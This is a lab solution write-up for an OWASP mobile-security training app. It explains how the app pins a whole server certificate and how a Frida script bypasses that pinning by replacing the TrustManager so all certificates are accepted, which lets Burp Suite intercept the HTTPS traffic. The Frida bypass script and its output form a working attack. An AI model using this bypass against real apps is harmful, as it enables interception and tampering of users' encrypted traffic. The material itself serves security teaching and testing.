# OMTG-Android - 22. SSL Pinning Whole Certificate - Solution

> MSTG-NETWORK-1: "Data is encrypted on the network using TLS. The secure channel is used consistently throughout the app."<br />
> MSTG-NETWORK-4: "The app either uses its own certificate store, or pins the endpoint certificate or public key, and subsequently does not establish connections with endpoints that offer a different certificate or key, even if signed by a trusted CA."

**Summary of the challenge:** The application is trying to access the `example.com` URL over `https` protocol by ensuring that no plain-text communication is used. This challenge demonstrates that [network traffic sent over HTTPS](https://developer.android.com/training/articles/security-ssl) along with certificate pinning is secure against Man-in-the-Middle attack by using `HttpsURLConnection` and `SSLSocket` (for socket-level communication using TLS) implementations.

SSL pinning also known as Public Key Pinning ensures that the certificate hard-coded in the application is the one that expected to be installed on the remote server instead of accepting any certificate signed by a trusted certificate authority.

Due to the source of the application is not obfuscated, the APK file can be decompiled by the use of JADX-GUI tool to review the implemented certificate pinning mechanism:
```java
public class OMTG_NETW_004_SSL_Pinning_Certificate extends AppCompatActivity {
  public void onCreate(Bundle savedInstanceState) {
    [...]
    try {
      HTTPSssLPinning();
    } catch (MalformedURLException e) {
      e.printStackTrace();
    }
    [...]
  
  private void HTTPSssLPinning() throws CertificateException, IOException, KeyStoreException, NoSuchAlgorithmException, KeyManagementException {
    CertificateFactory cf = CertificateFactory.getInstance(ACRAConstants.DEFAULT_CERTIFICATE_TYPE);
    InputStream caInput = new BufferedInputStream(getResources().openRawResource(C0000R.raw.certificate));
    Certificate ca = cf.generateCertificate(caInput);
    caInput.close();
    KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
    keyStore.load(null, null);
    keyStore.setCertificateEntry("ca", ca);
    Enumeration keyStoreAlias = keyStore.aliases();
    while (keyStoreAlias.hasMoreElements()) {
      System.out.println("KeyStore: " + keyStoreAlias.nextElement().toString());
    }
    TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
    tmf.init(keyStore);
    final SSLContext context = SSLContext.getInstance("TLS");
    context.init(null, tmf.getTrustManagers(), null);
    new Thread(new Runnable() {
      [...]
      }).start();
  }
}
```

A keystore file `mykeystore.bks` is embedded into the application, located under the `res/raw` directory. Using the [KeyStore Explorer](https://keystore-explorer.org/downloads.html) tool it is possible to export and view the included server certificate:

<img src="https://user-images.githubusercontent.com/55597077/67967604-cdd38580-fbfd-11e9-94c2-7e0088fc973f.png" width="596"> <img src="https://user-images.githubusercontent.com/55597077/67967633-dfb52880-fbfd-11e9-9eca-276843f523e9.png" width="296"> <img src="https://user-images.githubusercontent.com/55597077/67967641-e17eec00-fbfd-11e9-895e-e602c10c1155.png" width="296">

The server certificate is expired and since then a new certificate is in use on the `example.com` backend.

To capture the HTTPS traffic with an interception proxy such as Burp Suite, configure the proxy settings for the Wi-Fi network. Open Android's Settings application => Wi-Fi, to view a list of available networks => long press the name of the connected Wi-Fi network => Modify network => Advanced options => set Proxy option to Manual and provide the proxy server's IP address and port number:

<img src="https://user-images.githubusercontent.com/55597077/67943144-5851c000-fbd1-11e9-95d2-0d1b90f5ac18.png" width="296">

The following Frida script `22_ssl_pinning_whole_certificate.js` is forcing the application to accept any certificate by overwriting the functions `checkClientTrusted`, `checkServerTrusted`, and `getAcceptedIssuers`:
```javascript
Java.perform(function () {
  var SSLContext = Java.use('javax.net.ssl.SSLContext');
  var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');

  //Create a custom Java class as certificate and return a wrapper for it
  var CustomTrustManager = Java.registerClass({
    name: 'com.custom.TrustManager',
    implements: [X509TrustManager],
    methods: {
      checkClientTrusted: function (chain, authType) {
      },
      checkServerTrusted: function (chain, authType) {
      },
      getAcceptedIssuers: function () {
      return [];
      }
    }
  });

  //The custom TrustManager is used to authenticate the remote side of a secure socket when it is requested
  var NewTrustManager = [CustomTrustManager.$new()];
  //Instance of secure socket protocol implementation, initialized with a set of key, trustmanagers and secure random bytes 
  SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function (KeyManager, TrustManager, SecureRandom) {
    console.log('[*] TrustManager is overriden');
    this.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').call(this, KeyManager, NewTrustManager, SecureRandom);
  };
  console.log('[*] Certificate validation is bypassed');
});
```

Certificate is not required to be installed on the device's credential storage to bypass the validation:

<img src="https://user-images.githubusercontent.com/55597077/67968233-ec864c00-fbfe-11e9-9bc0-ac1c929bdcaa.png" width="296">

Tap on the SSL Pinning button to initiate a remote connection over HTTPS protocol:

<img src="https://user-images.githubusercontent.com/55597077/67968356-222b3500-fbff-11e9-8389-be03bd422922.png" width="296">

Frida console output of the certificate validation bypass:
```cmd
C:\>frida -U sg.vp.owasp_mobile.omtg_android -l 22_ssl_pinning_whole_certificate.js --no-pause
     ____
    / _  |   Frida 12.6.1 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at http://www.frida.re/docs/home/
Attaching...
[Motorola::sg.vp.owasp_mobile.omtg_android]-> 
[*] Certificate validation is bypassed
[*] TrustManager is overriden
```

The HTTPS traffic between the application and the `example.com` backend can be intercepted, monitored and modified by establishing Man-in-the-Middle attack using Burp Suite proxy on the device's network:

<img src="https://user-images.githubusercontent.com/55597077/67968170-d37d9b00-fbfe-11e9-89e1-d6309d369aed.png">
